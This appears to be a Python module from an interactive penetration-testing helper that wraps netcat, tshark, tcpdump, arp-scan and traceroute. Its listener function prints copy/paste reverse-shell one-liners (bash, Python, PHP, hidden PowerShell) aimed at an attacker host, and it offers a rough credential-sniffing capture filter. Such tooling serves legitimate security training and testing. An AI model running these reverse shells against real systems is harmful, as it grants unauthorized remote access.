from __future__ import annotations

import re
from typing import List, Optional

import questionary
from questionary import Choice
from rich import box
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

from core.config import Config
from core.state import SessionState
from core.theme import COLORS
from core.tools import require
from core.ui import ask_text, pause
from modules._shared import header, next_steps, run_with_preview, scripty_says


console = Console()


def netcat_listener() -> None:
    header("Network & Traffic", "Reverse shell listener: you wait, target connects, chaos begins (responsibly).")
    if not require("nc", friendly_name="netcat (nc)").ok:
        pause()
        return
    port = ask_text("Listen port", default="4444", placeholder="4444")
    if not port:
        return
    argv = ["nc", "-lvnp", port.strip()]
    run_with_preview(argv, title="nc listener", module_slug="net_nc_listener", warning="Ctrl+C to stop the listener.")

    shells = [
        ("bash", f"bash -i >& /dev/tcp/<LHOST>/{port.strip()} 0>&1"),
        ("python3", f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"<LHOST>\",{port.strip()}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"),
        ("php", f"php -r '$sock=fsockopen(\"<LHOST>\",{port.strip()});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        ("powershell", f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"<PAYLOAD>\"  # connect to <LHOST>:{port.strip()}"),
    ]
    t = Table(title="Reverse shell one-liners (copy/paste)", box=box.SIMPLE_HEAVY)
    t.add_column("Type", style=COLORS.primary, no_wrap=True)
    t.add_column("One-liner", style=COLORS.muted)
    for k, v in shells:
        t.add_row(k, v)
    console.print(t)
    scripty_says("Replace <LHOST> with your IP. Use the simplest payload that works, then upgrade to a TTY if you can.")
    pause()


def netcat_port_check() -> None:
    header("Network & Traffic", "Quick port check / banner grab. Sometimes the banner tells you exactly what to do next.")
    if not require("nc", friendly_name="netcat (nc)").ok:
        pause()
        return
    host = ask_text("Host", default="", placeholder="10.10.10.10")
    port = ask_text("Port", default="80", placeholder="80")
    if not host or not port:
        return
    mode = questionary.select(
        "Mode",
        choices=[
            Choice("Port check (-zv)", value="check"),
            Choice("Connect (interactive) (Ctrl+C to stop)", value="connect"),
            Choice("← Back", value=None, shortcut_key="q"),
        ],
        use_shortcuts=True,
    ).ask()
    if mode is None:
        return
    if mode == "check":
        argv = ["nc", "-zv", host.strip(), port.strip()]
        res = run_with_preview(argv, title="nc -zv", module_slug="net_nc_check")
        if res:
            scripty_says("If it says ‘succeeded’, the port is reachable. Then fingerprint the service with nmap -sV.")
    else:
        argv = ["nc", host.strip(), port.strip()]
        run_with_preview(argv, title="nc connect", module_slug="net_nc_connect", warning="This is interactive. Ctrl+C returns to menu.")
    pause()


def tshark_capture() -> None:
    header("Network & Traffic", "Packet capture with tshark. Great for seeing auth, DNS, and weird protocol behavior.")
    if not require("tshark", friendly_name="tshark").ok:
        pause()
        return
    list_res = run_with_preview(["tshark", "-D"], title="tshark -D", module_slug="net_tshark_list")
    if not list_res:
        return
    ifaces = []
    for ln in list_res.output.splitlines():
        m = re.match(r"^\s*(\d+)\.\s+(.*)$", ln.strip())
        if m:
            ifaces.append((m.group(1), m.group(2)))
    if not ifaces:
        scripty_says("Couldn’t parse interfaces. Check raw output.")
        pause()
        return
    sel = questionary.select(
        "Interface",
        choices=[Choice(f"{num}. {name}", value=num) for num, name in ifaces] + [Choice("← Back", value=None, shortcut_key="q")],
        use_shortcuts=True,
    ).ask()
    if sel is None:
        return

    filt_mode = questionary.select(
        "Filter (optional)",
        choices=[
            Choice("All traffic", value=""),
            Choice("HTTP", value="tcp port 80 or tcp port 8080"),
            Choice("DNS", value="udp port 53"),
            Choice("Credentials-ish (very rough)", value="tcp port 80 or tcp port 443 or tcp port 21 or tcp port 25"),
            Choice("Custom BPF…", value="custom"),
        ],
    ).ask()
    if filt_mode is None:
        return
    bpf = filt_mode
    if filt_mode == "custom":
        bpf = ask_text("BPF filter", default="", placeholder="Example: host 10.10.10.10 and tcp port 80", validate_non_empty=False) or ""

    save = questionary.confirm("Save to .pcap?", default=False).ask()
    out = None
    argv = ["tshark", "-l", "-i", str(sel)]
    if bpf.strip():
        argv += ["-f", bpf.strip()]
    if save:
        out = ask_text("Output path", default="capture.pcap", placeholder="capture.pcap") or "capture.pcap"
        argv += ["-w", out]

    run_with_preview(argv, title="tshark capture", module_slug="net_tshark_capture", warning="Live capture. Ctrl+C stops.")
    scripty_says("Capture stopped. If you saved a pcap, open it in Wireshark for deep inspection.")
    pause()


def tcpdump_capture() -> None:
    header("Network & Traffic", "tcpdump is the old reliable. Quick captures, easy filters.")
    if not require("tcpdump", friendly_name="tcpdump").ok:
        pause()
        return
    iface = ask_text("Interface", default="eth0", placeholder="eth0 / wlan0 / en0", validate_non_empty=False) or ""
    bpf = ask_text("BPF filter (optional)", default="", placeholder="host 10.10.10.10 and tcp port 80", validate_non_empty=False) or ""
    argv = ["tcpdump", "-n", "-i", iface.strip() or "any"]
    if bpf.strip():
        argv += bpf.strip().split()
    run_with_preview(argv, title="tcpdump", module_slug="net_tcpdump", warning="Live capture. Ctrl+C stops.")
    pause()


def arp_scan() -> None:
    header("Network & Traffic", "Local network discovery. Good for finding targets on your LAN/VPN segment.")
    tool = None
    if require("arp-scan", friendly_name="arp-scan").ok:
        tool = "arp-scan"
    elif require("netdiscover", friendly_name="netdiscover").ok:
        tool = "netdiscover"
    else:
        scripty_says("Need arp-scan or netdiscover installed.")
        pause()
        return

    if tool == "arp-scan":
        res = run_with_preview(["arp-scan", "-l"], title="arp-scan -l", module_slug="net_arp_scan")
        if not res:
            return
        rows = []
        for ln in res.output.splitlines():
            parts = ln.split("\t")
            if len(parts) >= 2 and re.match(r"^\d+\.\d+\.\d+\.\d+$", parts[0].strip()):
                rows.append((parts[0].strip(), parts[1].strip(), (parts[2].strip() if len(parts) > 2 else "")))
        if rows:
            t = Table(title="Local hosts", box=box.SIMPLE_HEAVY)
            t.add_column("IP", style=COLORS.primary, no_wrap=True)
            t.add_column("MAC", style=COLORS.muted)
            t.add_column("Vendor", style=COLORS.muted)
            for ip, mac, vendor in rows[:80]:
                t.add_row(ip, mac, vendor)
            console.print(t)
            scripty_says("Now pick a host and run recon scans. Don’t scan grandma’s printer unless it’s in-scope.")
    else:
        run_with_preview(["netdiscover"], title="netdiscover", module_slug="net_netdiscover", warning="Interactive output. Ctrl+C stops.")
    pause()


def traceroute_run() -> None:
    header("Network & Traffic", "Traceroute shows network path and latency hops. Useful for routing and segmentation clues.")
    tool = None
    if require("traceroute", friendly_name="traceroute").ok:
        tool = "traceroute"
    elif require("tracepath", friendly_name="tracepath").ok:
        tool = "tracepath"
    else:
        scripty_says("Need traceroute or tracepath installed.")
        pause()
        return
    target = ask_text("Target", default="", placeholder="example.com or 10.10.10.10")
    if not target:
        return
    argv = [tool, target.strip()]
    res = run_with_preview(argv, title=tool, module_slug="net_traceroute")
    if res:
        scripty_says("Traceroute done. Look for where latency spikes or where hops disappear (filtered).")
    pause()


def menu(*, state: SessionState, cfg: Config) -> None:
    while True:
        header("Network & Traffic", "Sniff packets, scan services, reverse shells. This is where ‘it works’ becomes ‘I see why’.")
        try:
            sel = questionary.select(
                "Pick a network action",
                choices=[
                    Choice("5.1 Netcat — Reverse Shell Listener", value="listener"),
                    Choice("5.2 Netcat — Port Check / Banner Grab", value="nc"),
                    Choice("5.3 Wireshark / tshark Capture", value="tshark"),
                    Choice("5.4 tcpdump Quick Capture", value="tcpdump"),
                    Choice("5.5 ARP Scan / Local Network Discovery", value="arp"),
                    Choice("5.6 Traceroute", value="trace"),
                    Choice("← Back", value=None, shortcut_key="q"),
                ],
                instruction="Ctrl+C to go back.",
                use_shortcuts=True,
            ).ask()
        except KeyboardInterrupt:
            return

        if sel is None:
            return
        if sel == "listener":
            netcat_listener()
        elif sel == "nc":
            netcat_port_check()
        elif sel == "tshark":
            tshark_capture()
        elif sel == "tcpdump":
            tcpdump_capture()
        elif sel == "arp":
            arp_scan()
        elif sel == "trace":
            traceroute_run()


if __name__ == "__main__":
    menu(state=SessionState(sticky_target=None), cfg=Config())

